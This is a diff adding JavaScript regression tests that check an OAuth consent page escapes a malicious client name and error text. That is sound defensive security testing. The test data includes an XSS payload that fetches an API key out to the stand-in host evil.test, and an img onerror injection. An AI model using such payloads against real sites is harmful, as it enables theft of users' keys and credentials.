@@ -59,6 +59,39 @@ async function main() {
     assert.strictEqual(b, c);
   });
 
+  // ── OAuth consent page XSS ────────────────────────────────────────────────
+  const oauth = await import(path.join(__dirname, "..", "dist", "routes", "oauth.js"));
+  console.log("OAuth — consent page escaping:");
+  test("client_name is escaped in the document title and body", () => {
+    const maliciousClient = `</title><script>fetch("https://evil.test/?k="+apiKey.value)</script><title>`;
+    const html = oauth.CONSENT_PAGE(
+      maliciousClient,
+      "tools:read tools:execute",
+      "arch_client",
+      "https://client.example/callback",
+      "state",
+      "challenge",
+      "S256"
+    );
+    assert.ok(!html.includes("<script>"), "raw script tag must not be rendered");
+    assert.ok(!html.includes("</title><script>"), "client name must not break out of title");
+    assert.ok(html.includes("&lt;/title&gt;&lt;script&gt;"), "escaped client name should still be displayed as text");
+  });
+  test("consent page error text is escaped", () => {
+    const html = oauth.CONSENT_PAGE(
+      "Safe Client",
+      "tools:read",
+      "arch_client",
+      "https://client.example/callback",
+      "",
+      "",
+      "",
+      `<img src=x onerror=alert(1)>`
+    );
+    assert.ok(!html.includes("<img src=x"), "raw error HTML must not render");
+    assert.ok(html.includes("&lt;img src=x onerror=alert(1)&gt;"));
+  });
+
   // ── M1b: atomic identity claim (SignupIdentity unique guard) ────────────
   // Exercises the REAL claimSignupIdentity path with prisma.$executeRaw
   // stubbed to simulate Postgres ON CONFLICT semantics: first INSERT for a
